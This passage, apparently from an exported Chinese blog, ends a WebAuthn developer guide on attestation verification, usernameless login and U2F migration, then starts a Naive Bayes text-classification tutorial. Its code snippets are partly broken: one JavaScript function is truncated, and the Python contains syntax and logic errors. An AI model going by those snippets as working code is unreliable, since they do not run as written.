和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 个特征，对于文本分类来说，这就是一段文本中的某个单词。</p>\n<p>朴素贝叶斯之所以“朴素”，是因为它要求<strong>各个特征间是独立的</strong>，在文本分类中也就是各个单词之间互不干扰。虽然思路简单的代价是适用范围变窄，不过由于这样的简化在很多情况下已经足够了，因此实际上朴素贝叶斯的应用范围非常广。<del>你看朴素贝叶斯 <strong>N</strong>aïve <strong>B</strong>ayes 的缩写都是 NB 了，能不厉害吗（逃</del></p>\n<h1>那么，咋分类啊</h1>\n<p>看来你这下完全听懂了呢（笑），是时候看看如何在 NLP 中应用朴素贝叶斯了。和上面一样，我们用一个具体的例子来说明。我们的目标是让电脑学会分类美国共和党和民主党的演讲稿，由于两个党派的演讲风格不同，所以这样的分类在理论上是可行的。</p>\n<div class=\"wp-block-file\">\n<a href=\"https://acdn.flyhigher.top/nlp/material.zip\" download>material.zip</a><a href=\"https://acdn.flyhigher.top/nlp/material.zip\" class=\"wp-block-file__button\" download>下载</a>\n</div>\n<p>上面我们要用到的数据集，你可以下载下来一起动手玩一玩。先说一下数据集的数据结构吧，压缩包里有两个文件，<code>train.txt</code> 将会被当作训练数据集，而 <code>test.txt</code> 则会作为训练结束后的验证数据集。两个文本文件里数据的结构是类似的，就像这样：</p>\n<pre class=\"EnlighterJSRAW\">BLUE WELL I AM SO HONORED AND PERSONALLY UNKNOWNWORD TO BE HERE...\r\nRED THANK YOU . THIS IS QUITE AN INSTITUTION . IT'S GOOD TO BE...</pre>\n<p>每行都是一篇演讲稿，每行的第一个单词指明了这篇演讲稿所属的党派，<code>RED</code> 指共和党，而 <code>BLUE</code> 指民主党。所有单词和符号都已经被转为大写并由空格分隔方便处理。<code>train.txt</code> 有共和党演讲稿和民主党演讲稿各 23 篇，<code>test.txt</code> 有 6 篇共和党演讲稿，12 篇民主党演讲稿。</p>\n<p>明白了？那我们就开始吧。</p>\n<h2>捋捋思路</h2>\n<p>首先，我们需要考虑如何在文本分类中应用朴素贝叶斯。很简单，按朴素贝叶斯的思路，<strong>计算每个词在某一分类下的出现概率，然后将某篇文章的所有词的概率相乘，再乘以该分类的先验概率，就可以得到某篇文章在某一分类下的概率。</strong></p>\n<p>$$P(Class|Article) = P(Class)\\prod_{i}P(Word_i|Class)$$</p>\n<p>各个分类概率都计算完成后，概率最高的那个分类就是这篇文章可能所属的分类。这个思路的核心就是用词决定了文本风格，文本的不同类别用词会有差异，只要能量化这些差异就可以分类文本。在我们的例子中，我们可以从 <code>train.txt</code> 中统计各个词汇的出现情况，然后用 <code>test.txt</code> 中的数据按上面的算法验证我们算法的准确性。</p>\n<p>这个思路很简单也很清晰，但还有一些问题需要解决。<strong>第一，有的时候，我们的测试数据集中可能会出现一个在训练数据集中没有出现过的词语。这个时候，朴素贝叶斯的计算结果会是 0。</strong>如果我们把 0 乘进式子中，那就别想得到正常的结果了。所以，我们还需要对计算某一单词在某一分类中的式子稍加改进。使用拉普拉斯平滑，就可以避免出现概率为 0 的情况。别被名字吓到，拉普拉斯平滑是一种非常简单的平滑方法：在分子上 +1，在分母上加整个取值范围，这样就可以给整个分式加上非常微小的偏移，避免出现 0。</p>\n<p>$$\\begin{align} P(Word_i|Class) &amp; = \\frac{Word_iCountInClass}{AllWordCountInClass} \\\\ &amp; \\approx \\frac{Word_iCountInClass + 1}{AllWordCountInClass + UniqueWordCount} \\end{align}$$</p>\n<p><strong>第二，对于长文本，大部分词语在某一分类中的出现概率是远小于 1 的，加上长文本词汇量大，往往概率相乘的结果会非常小。</strong>受限于计算机处理浮点数的原理，精确处理这么小的数字是很麻烦的。幸好，运用一些简单的数学知识就可以将其转化为更精确的表达，<strong>那就是取对数。</strong></p>\n<p>首先，将概率计算结果取对数并不影响我们的计算结果。因为取对数是一个单调递增的操作，而我们计算概率只是为了排序选择概率最高的分类，因此取对数是不影响我们排序的。而把多项式取对数，等于把多项式的每一项取对数后相加。所以我们有：</p>\n<p>$$\\lg{\\Big(P(Class)\\prod_{i}P(Word_i|Class)\\Big)} = \\lg{P(Class)} + \\sum_i\\lg{P(Word_i|Class)}$$</p>\n<p>大部分情况下，在每一次取对数的时候，要取对数的数字的大小，即 \\(P(Word_i|Class)\\) 尚还在计算机能处理的范围内，<strong>因此我们可以放心地使用取对数的方法</strong>，避免计算机精度不够影响结果。</p>\n<p><strong>第三就是在某些情况下，可能会有部分词语干扰计算结果</strong>，如 and, is 这类的被大量使用的中性词。如果希望得到更好的结果，我们可以维护一个停用词表，在计算时排除停用词即可。或者，我们可以在计算完每个单词的出现数量后，排除数量最多的前 \\(N\\) 个单词，避免这些单词过多地影响计算。</p>\n<h2>写点代码</h2>\n<p>现在我们终于可以开始实战，写点代码了。我会用简单的 Python 来表达思路。好了，理一理思绪，第一步我们要做的，是统计训练数据集中的用词情况。具体来说，根据上面的思考，我们需要统计的有：</p>\n<ul>\n<li>每个单词在各分类中出现的数量</li>\n<li>各分类中的不重复词数量</li>\n</ul>\n<p>用 Python 简单表示如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">#读入数据过程略...\r\ndata_raw = \"读入的数据\".split('\\n') #按行分隔\r\ndata_blue = []\r\ndata_red = []\r\nword_count_blue = {}\r\nword_count_red = {}\r\n\r\nfor line_data in data_raw:\r\n    word_list = line_data.split(\" \") #分隔单词\r\n    if word_list[0] == \"BLUE\":\r\n        for i in range(1,len(word_list)):\r\n            if not is_excluded(word_list[i]): #判断是否为停用词\r\n                data_blue.append(word_list[i])\r\n                #统计单词出现次数\r\n                word_count_blue.setdefault(word_list[i], 0)\r\n                word_count_blue[word_list[i]] += 1\r\n    elif if word_list[0] == \"RED\":\r\n        #Class = red 时同理...\r\n\r\n#统计非重复词\r\nunique_words_blue = list(set(data_blue))\r\nunique_words_red = list(set(data_red))</pre>\n<p>训练过程到这里就结束了，计算机已经知道了各政党演讲的用词习惯。很简单吧？接下来我们就要使用测试数据集来测试准确度了。<strong>这里开始就涉及到朴素贝叶斯的计算了</strong>，可能会稍微复杂一点点。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"python\">import math\r\n#读入测试数据过程略...\r\ntest_data_raw = \"读入的数据\".split('\\n') #按行分隔\r\ntest_data = []\r\n\r\nfor for line_data in test_data_raw:\r\n    if line_data[0] == \"BLUE\":\r\n        content_data = line_data.split(\" \").pop(0)\r\n        test_data.append({\"class\": \"blue\", \"content\": content_data})\r\n\r\nfor line_data in test_data:\r\n    if line_data[\"class\"] == 'blue':\r\n        posibility_blue = 0\r\n        for word in line_data[\"content\"]:\r\n            